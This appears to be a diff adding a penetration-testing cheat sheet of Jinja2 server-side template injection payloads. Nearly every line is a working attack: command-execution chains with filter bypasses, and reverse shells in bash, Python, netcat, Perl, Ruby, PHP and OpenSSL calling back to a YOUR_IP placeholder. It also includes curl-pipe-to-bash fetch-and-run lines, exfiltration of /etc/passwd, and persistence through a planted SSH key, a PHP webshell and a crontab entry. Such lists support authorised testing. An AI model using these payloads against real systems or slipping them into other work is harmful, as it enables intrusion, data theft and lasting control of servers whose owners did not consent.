@@ -1,0 +1,134 @@
+Command Execution Tests
+
+# Basic command test
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+# Alternative RCE paths
+{{''.__class__.__mro__[1].__subclasses__()}}
+# Find subprocess.Popen index (common: 396, 401, 409, 418)
+{{''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate()}}
+
+# Bypass filters - dot filter
+{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
+
+# Bypass filters - underscore filter with hex
+{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
+
+# Bypass with attr()
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+
+
+Outbound Connectivity Tests
+
+Start Python/NC sever  python3 -m http.server 8888  /  -nc -lvnp 8888
+
+# HTTP callback
+{{config.__class__.__init__.__globals__['os'].popen('curl http://YOUR_IP:8000/test').read()}}
+{{cycler.__init__.__globals__.os.popen('wget http://YOUR_IP:8000/test -O /dev/null').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('ping -c 1 YOUR_IP').read()}}
+
+# DNS callback
+{{config.__class__.__init__.__globals__['os'].popen('nslookup YOUR_IP').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('dig @YOUR_IP test.domain.com').read()}}
+
+
+Reverse Shells
+
+Python Reverse Shells
+
+# Python3 reverse shell (most reliable)
+{{config.__class__.__init__.__globals__['os'].popen('python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"YOUR_IP\\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\\"/bin/bash\\",\\"-i\\"])"').read()}}
+
+# Python2 reverse shell
+{{config.__class__.__init__.__globals__['os'].popen('python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"YOUR_IP\\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\\"/bin/sh\\",\\"-i\\"])"').read()}}
+
+# Short Python reverse shell
+{{config.__class__.__init__.__globals__['os'].popen('python -c "import os,pty,socket;s=socket.socket();s.connect((\\"YOUR_IP\\",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"bash\\")"').read()}}
+
+
+Base64 Encoded Reverse Shells
+
+# Base64 payload (replace with your encoded reverse shell)
+{{config.__class__.__init__.__globals__['os'].popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQL1BPUlQgMD4mMQ==" | base64 -d | bash').read()}}
+
+# Base64 with sh (if bash not available)
+{{config.__class__.__init__.__globals__['os'].popen('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9ZT1VSX0lQL1BPUlQgMD4mMQ==" | base64 -d | sh').read()}}
+
+
+Fetch and Execute
+
+# Download and run script
+{{config.__class__.__init__.__globals__['os'].popen('curl http://YOUR_IP:8000/shell.sh | bash').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('wget http://YOUR_IP:8000/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh').read()}}
+
+# Download binary and execute
+{{config.__class__.__init__.__globals__['os'].popen('curl http://YOUR_IP:8000/nc -o /tmp/nc && chmod +x /tmp/nc && /tmp/nc -e /bin/sh YOUR_IP PORT').read()}}
+
+
+Netcat Reverse Shells
+
+# Netcat with -e
+{{config.__class__.__init__.__globals__['os'].popen('nc -e /bin/sh YOUR_IP PORT').read()}}
+
+# Netcat without -e (mkfifo method)
+{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP PORT >/tmp/f').read()}}
+
+
+Bash Reverse Shells
+
+# Bash with /dev/tcp
+{{config.__class__.__init__.__globals__['os'].popen('bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1').read()}}
+
+# Bash with file descriptor
+{{config.__class__.__init__.__globals__['os'].popen('exec 5<>/dev/tcp/YOUR_IP/PORT;cat <&5|while read line;do $line 2>&5 >&5;done').read()}}
+
+
+Perl Reverse Shell
+
+# Perl reverse shell
+{{config.__class__.__init__.__globals__['os'].popen('perl -e "use Socket;\$i=\\"YOUR_IP\\";\$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\\">&S\\");open(STDOUT,\\">&S\\");open(STDERR,\\">&S\\");exec(\\"/bin/sh -i\\");}"').read()}}
+
+
+Ruby Reverse Shell
+
+# Ruby reverse shell
+{{config.__class__.__init__.__globals__['os'].popen('ruby -rsocket -e "exit if fork;c=TCPSocket.new(\\"YOUR_IP\\",PORT);while(cmd=c.gets);IO.popen(cmd,\\"r\\"){|io|c.print io.read}end"').read()}}
+
+
+PHP Reverse Shell (if PHP installed)
+
+# PHP reverse shell
+{{config.__class__.__init__.__globals__['os'].popen('php -r "\$sock=fsockopen(\\"YOUR_IP\\",PORT);exec(\\"/bin/sh -i <&3 >&3 2>&3\\");"').read()}}
+OpenSSL Reverse Shell
+
+# OpenSSL reverse shell (listener: openssl s_server -quiet -key key.pem -cert cert.pem -port PORT)
+{{config.__class__.__init__.__globals__['os'].popen('mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect YOUR_IP:PORT > /tmp/s; rm /tmp/s').read()}}
+
+
+Blind/Time-Based Payloads
+
+# Time-based test
+{{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}
+
+# Conditional time-based
+{% if config.__class__.__init__.__globals__['os'].popen('id').read() == 'root' %} {{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}} {% endif %}
+
+# Out-of-band data exfiltration
+{{config.__class__.__init__.__globals__['os'].popen('curl http://YOUR_IP:8000/$(cat /etc/passwd | head -1 | base64)').read()}}
+
+
+File Write Payloads
+
+# Write SSH key
+{{config.__class__.__init__.__globals__['os'].popen('echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC..." > /root/.ssh/authorized_keys').read()}}
+
+# Write webshell
+{{config.__class__.__init__.__globals__['os'].popen('echo "<?php system(\$_GET[\'cmd\']); ?>" > /var/www/html/shell.php').read()}}
+
+# Write cron job
+{{config.__class__.__init__.__globals__['os'].popen('echo "* * * * * root bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1" >> /etc/crontab').read()}}
